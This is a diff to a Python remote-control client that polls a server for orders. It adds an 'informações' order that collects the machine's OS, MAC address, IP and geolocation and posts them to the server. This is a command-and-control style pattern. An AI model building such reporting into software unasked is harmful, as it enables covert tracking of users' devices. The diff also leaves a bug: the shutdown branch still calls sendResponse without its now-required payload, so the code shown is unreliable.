@@ -1,6 +1,10 @@
 import requests
 import json
 import time
+import platform
+from uuid import getnode as get_mac
+import socket
+import geocoder
 
 class RemoteControl:
   def __init__(
@@ -23,13 +27,13 @@ class RemoteControl:
     orderJson = json.loads(self.order)
     return orderJson['executed']
 
-  def sendResponse(self):
+  def sendResponse(self, payload):
     time.sleep(1)
     response = requests.get(self.response_url)
     csrftoken = response.cookies['csrftoken']
-    payload = {
-              'executed':'True',
-              }
+    # payload = {
+    #           'executed':'True',
+    #           }
     headers = {
               'Referer': self.response_url,
               'X-CSRFToken': csrftoken
@@ -38,10 +42,27 @@ class RemoteControl:
     requests.post(self.response_url, data=payload, headers=headers,cookies=cookie)
     self.order = None
 
+  def getMachineInfoPayload(self):
+    os = platform.system()
+    mac = get_mac()
+    mac = ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
+    ip = socket.gethostbyname(socket.gethostname())
+    location = geocoder.ip('me').address
+    payload = {
+      'executed':'True',
+      'os':os,
+      'mac':mac,
+      'ip':ip,
+      'location':location,
+    }
+    return payload
+
   def executeOrder(self):
     self.getOrderJson()
     if(self.checkExecuted() == 'False'):
       if(self.getCleanOrder() == 'desligar'):
         self.sendResponse()
+      elif(self.getCleanOrder() == 'informações'):
+        self.sendResponse(payload=self.getMachineInfoPayload())
     else:
       return 'no orders to execute'
